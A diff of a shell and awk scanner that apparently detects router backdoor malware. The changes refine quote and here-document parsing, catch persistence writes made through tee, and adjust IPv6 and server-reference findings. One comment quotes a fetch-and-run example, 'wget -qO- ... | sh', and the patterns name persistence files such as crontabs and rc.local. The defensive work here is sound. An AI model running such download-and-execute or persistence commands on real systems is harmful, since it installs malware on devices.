@@ -519,13 +519,16 @@ strs() { tr '\000' '\n' <"$1" 2>/dev/null; }
 # name and a tool count together only in the same command. A comment that names the
 # malware or its server is the owner's note (review of 2.53).
 # Quotes are read as sh reads them (review of 2.54): a ; & | or # inside a quoted string
-# neither splits nor starts a comment, as in wget -qO- "http://.../ni.sh?a=1&b=2" | sh,
-# unless the string is a command itself: after sh -c, su -c, eval or trap, and from $( or
-# a backtick on in a string in double quotes. A string that goes on over several lines is
-# one line here. The text of a here-document is dropped unless a shell reads it or it goes
-# into a file that starts programs (crontab, rc.local, ...); where its end is not found,
-# it is read after all. A quote that stays open for more than 20 lines is taken as
-# closed. $2 is 1 for the command line of a process: it has no comments.
+# neither splits nor starts a comment, as in wget -qO- "http://.../ni.sh?a=1&b=2" | sh.
+# A string that is a command itself (after sh -c, su -c, eval, trap, watch, ssh, xargs
+# and the like, and from $( or a backtick on inside double quotes) is split as before,
+# line by line. A string of data that goes on over several lines is one line here, its
+# line ends kept as \005 (writes() splits there). Wherever this reading could hide what sh
+# runs, the plain reading is used instead, which splits everywhere: the text of a
+# here-document (sh does not read quotes there), a string still open after 20 lines or
+# at the end (the rest of the file is then read plainly), and a line of more than 4096
+# characters, which is also given whole. $2 is 1 for the command line of a process: it
+# has no comments.
 active_in() {
 	awk -v nj="${1:-0}" -v pc="${2:-0}" '
 	function out(l) {
@@ -533,25 +536,24 @@ active_in() {
 		gsub(/\001/, ";", l); gsub(/\002/, "\\&", l); gsub(/\003/, "|", l); gsub(/\004/, "#", l)
 		print l
 	}
-	# the line with ; & | # inside data strings replaced, a comment cut off; sets q (the
-	# open quote) and hd (the word that ends a here-document)
-	function scan(l,   i, n, c, o, r) {
+	# the reading before 2.54: a comment from # on, then split
+	function plain(l) { if (!pc) sub(/(^|[[:space:]])#.*$/, "", l); out(l) }
+	# the lines held for an open string, read plainly after all
+	function flush(  i) { for (i = 1; i <= nr; i++) plain(raw[i]); nr = 0; b = ""; q = ""; hd = "" }
+	# the line with ; & | # inside a string of data replaced, a comment cut off; sets q
+	# (the open quote), code (that string is a command) and hd (a here-document follows)
+	function scan(l,   i, n, c, o, r, sg) {
 		o = ""; n = length(l)
-		if (n > 4096) q = ""
-		# without quotes, and on a very long line (a binary file), the plain way
-		if (q == "" && (l !~ /["\047]/ || n > 4096)) {
-			if (!pc) sub(/(^|[[:space:]])#.*$/, "", l)
-			if (match(l, /<<-?[[:space:]]*[^[:space:];&|<>()]+/) && substr(l, RSTART, 3) != "<<<") {
-				hd = substr(l, RSTART + 2, RLENGTH - 2); sub(/^-/, "", hd); sub(/^[[:space:]]*/, "", hd); gsub(/["\047\\]/, "", hd)
-			}
-			return l
-		}
 		for (i = 1; i <= n; i++) {
 			c = substr(l, i, 1)
 			if (q == "") {
 				if (c == "\\") { o = o substr(l, i, 2); i++; continue }
 				if (c == "#" && !pc && (i == 1 || substr(l, i - 1, 1) ~ /[[:space:]]/)) break
-				if (c == "\"" || c == "\047") { code = (o ~ /(^|[[:space:]])(-[A-Za-z]*c|eval|trap)[[:space:]]*$/); q = c; o = o c; continue }
+				if (c == "\"" || c == "\047") {
+					sg = o; sub(/.*[;&|(]/, "", sg)
+					code = (o ~ /(^|[[:space:]])-[A-Za-z]*c[[:space:]]*$/ || sg ~ /(^|[[:space:]\/])(eval|trap|watch|ssh|xargs|su|sudo|timeout|nohup|setsid|env|nice|ionice|flock|chrt|taskset|busybox)[[:space:]]/)
+					q = c; o = o c; continue
+				}
 				if (c == "<" && substr(l, i, 2) == "<<" && substr(l, i, 3) != "<<<") {
 					# the word as sh takes it, its quotes removed: <<"E"OF ends at EOF
 					r = substr(l, i + 2); sub(/^-/, "", r); sub(/^[[:space:]]*/, "", r)
@@ -567,28 +569,26 @@ active_in() {
 		}
 		return o
 	}
-	# the text of a here-document: drop it, or read it as commands
-	body != "" { t = $0; sub(/^[[:space:]]*/, "", t); sub(/[[:space:]]*$/, "", t); if (t == body) { body = ""; nd = 0; next } if (!keep) { drop[++nd] = $0; next } }
+	# the text of a here-document, up to its end, plainly, line by line
+	body != "" { t = $0; sub(/^[[:space:]]*/, "", t); sub(/[[:space:]]*$/, "", t); if (t == body) body = ""; else plain($0); next }
+	rest { plain($0); next }
+	length($0) > 4096 { if (q != "") rest = 1; if (nr) flush(); plain($0); if (/["\047]/) print; next }
 	q == "" && b == "" && !pc && /^[[:space:]]*#/ { next }
 	{
+		raw[++nr] = $0
 		l = scan($0)
+		if (q != "" && code) { out(b l); b = ""; nr = 0; next }
 		if (q != "") {
-			if (nj || ++open > 20) { q = ""; open = 0 }
-			else { b = b l " "; next }
+			if (nj || nr > 20) { flush(); rest = !nj; next }
+			b = b l "\005"; next
 		}
-		open = 0; l = b l; b = ""
+		l = b l; b = ""
 		if (!nj && l ~ /(^|[^\\])(\\\\)*\\$/) { sub(/\\$/, "", l); b = l " "; next }
+		nr = 0
 		out(l)
-		if (hd != "") {
-			body = hd; hd = ""
-			keep = (l ~ /(^|[[:space:]\/])(ba|a|da)?sh([[:space:]]|$)|[|]|crontab|>>?[[:space:]]*[^[:space:]]*(crontabs?\/|rc\.local|init\.d\/|rc\.d\/|uci-defaults\/|hotplug\.d\/|profile)/)
-		}
+		if (hd != "") { body = hd; hd = "" }
 	}
-	END {
-		if (b != "") out(b)
-		# a here-document without its end: read what was dropped after all
-		for (i = 1; i <= nd; i++) { q = ""; hd = ""; t = scan(drop[i]); if (t ~ /[^[:space:]]/) out(t) }
-	}'
+	END { if (q != "") flush(); else if (b != "") out(b) }'
 }
 # Files that are read line by line: crontabs and the lists of files a firmware update keeps
 linewise() { case $1 in *crontabs/* | *crontabs.d/* | *sysupgrade.conf | */keep.d/*) return 0 ;; esac; return 1; }
@@ -668,12 +668,12 @@ ran() {
 writes() {
 	awk '{ print; l = $0 }
 	l !~ /^[[:space:](!{]*(echo|printf)[[:space:]]/ { next }
-	l !~ />>?[[:space:]]*[^[:space:]]*(crontabs?\/|rc\.local|init\.d\/|rc\.d\/|uci-defaults\/|hotplug\.d\/|profile)/ && l !~ /[|][[:space:]]*crontab([[:space:]]|$)/ { next }
+	l !~ /(>>?|[|][[:space:]]*tee([[:space:]]+-a)?)[[:space:]]*[^[:space:]]*(crontabs?\/|rc\.local|init\.d\/|rc\.d\/|uci-defaults\/|hotplug\.d\/|profile)/ && l !~ /[|][[:space:]]*crontab([[:space:]]|$)/ { next }
 	{
 		sub(/^[[:space:](!{]*(echo|printf)([[:space:]]+-[A-Za-z]+)*[[:space:]]+/, "", l)
-		sub(/[[:space:]]*[|][[:space:]]*crontab([[:space:]].*)?$/, "", l)
+		sub(/[[:space:]]*[|][[:space:]]*(crontab|tee)([[:space:]].*)?$/, "", l)
 		sub(/[[:space:]]*[0-9]*>>?[[:space:]]*[^[:space:]]+[[:space:]]*$/, "", l)
-		sub(/[)}[:space:]]+$/, "", l); gsub(/%s|\\n|\|\||&&|;|&/, "\n", l); gsub(/["\047]/, "", l)
+		sub(/[)}[:space:]]+$/, "", l); gsub(/%s|\\n|\005|\|\||&&|;|&/, "\n", l); gsub(/["\047]/, "", l)
 		n = split(l, a, "\n")
 		for (k = 1; k <= n; k++) { sub(/^[[:space:]]*#.*$/, "", a[k]); if (a[k] ~ /[^[:space:]]/) print a[k] }
 	}'
@@ -816,8 +816,8 @@ bd_answer() {
 	BDRE=$BD_HOST_RE awk '{ ip = ""; re = ENVIRON["BDRE"]
 		if ($0 ~ ("://[^/[:space:]]*(" re ")")) { print "url"; next }
 		if ($0 ~ /^[[:space:]]*list[[:space:]]+[A-Za-z_]*(block|black|deny|bl_)[A-Za-z_]*[[:space:]]/) { print "block"; next }
-		if (match($0, /^[[:space:]]*([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+|[0-9a-fA-F]*:[0-9a-fA-F:.]*)[[:space:]]/)) { ip = substr($0, RSTART, RLENGTH); gsub(/[[:space:]]/, "", ip) }
-		else if (match($0, /(address|server|local)[= ][^\/]*\/[^[:space:]]*\/([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+|[0-9a-fA-F]*:[0-9a-fA-F:.]*)/)) { ip = substr($0, RSTART, RLENGTH); sub(/.*\//, "", ip) }
+		if (match($0, /^[[:space:]]*([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+|[0-9a-fA-F]+:[0-9a-fA-F:.]*|::[0-9a-fA-F:.]*)[[:space:]]/)) { ip = substr($0, RSTART, RLENGTH); gsub(/[[:space:]]/, "", ip) }
+		else if (match($0, /(address|server|local)[= ][^\/]*\/[^[:space:]]*\/([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+|[0-9a-fA-F]+:[0-9a-fA-F:.]*|::[0-9a-fA-F:.]*)/)) { ip = substr($0, RSTART, RLENGTH); sub(/.*\//, "", ip) }
 		if (ip == "") print "name"
 		else if (ip ~ /^(10\.|192\.168\.|172\.(1[6-9]|2[0-9]|3[01])\.|127\.|0\.0\.0\.0$|::1?$|[fF][cCdD][0-9a-fA-F]*:|[fF][eE]80:)/) print "block"
 		else print "dns" }'
@@ -1263,7 +1263,7 @@ known_service_link() {
 }
 
 check_review() {
-	local p e base u
+	local p e base u seen
 	if [ -n "$UPPER" ]; then base=$UPPER; elif [ -n "$LOWER" ]; then base=${ROOT%/}; else base=; fi
 	if [ -n "$base" ]; then
 		for p in $REVIEW_PATHS; do
@@ -1277,8 +1277,11 @@ check_review() {
 				esac
 				whiteout "$f" && continue
 				same_as_lower "$rel" && continue
-				# a block of the older backdoor's names does not hide what else the file does
-				grep -v "^INFO${TAB}backdoor-block${TAB}" "$FIND" | grep -q "${TAB}/$rel${TAB}" && continue
+				# a finding of the older backdoor (a block of its names too) does not hide what
+				# else the file does: the gl-helper checks still run, only the REVIEW lines are
+				# left out (review of 2.54)
+				grep "^[A-Z]*${TAB}[a-z-]*${TAB}/$rel${TAB}" "$FIND" | cut -f2 | grep -qvE '^(backdoor-[a-z]+|server-ref)$' && continue
+				seen=; grep -v "^INFO${TAB}backdoor-block${TAB}" "$FIND" | grep -q "^[A-Z]*${TAB}[a-z-]*${TAB}/$rel${TAB}" && seen=1
 				[ -n "$(pkg_new "/$rel")" ] && continue
 				case $rel in etc/rc.d/*) known_service_link "$f" && continue ;; esac
 				u=
@@ -1299,8 +1302,9 @@ check_review() {
 				# a server of the malware: only what fetches from it starts the malware, and
 				# only that is removed. A block is the owner's, and the file is listed for
 				# review like any other; a name alone is for review.
+				case $u in fetch) add IOC persist-ref "/$rel" "fetches from a server of the malware ($(srv_names "$f"))"; continue ;; esac
+				[ -n "$seen" ] && continue
 				case $u in
-				fetch) add IOC persist-ref "/$rel" "fetches from a server of the malware ($(srv_names "$f"))"; continue ;;
 				block) add INFO server-block "/$rel" "blocks a server of the malware ($(srv_names "$f")): a block, not the malware" ;;
 				name) add REVIEW server-ref "/$rel" "names a server of the malware ($(srv_names "$f")), but does not fetch from it"; continue ;;
 				esac
@@ -1612,7 +1616,8 @@ astrowarp_on() {
 }
 
 # Was a state file written at the SD-WAN module's start: within two minutes of its other
-# state files (issue 19)?
+# state files (issue 19)? Not known: whether the handler rewrites those files too when it
+# runs a message; if it does, a message right after the module's start is not told apart.
 mp_module_start() {
 	local t o g
 	t=$(date -u -r "$1" +%s 2>/dev/null) || return 1
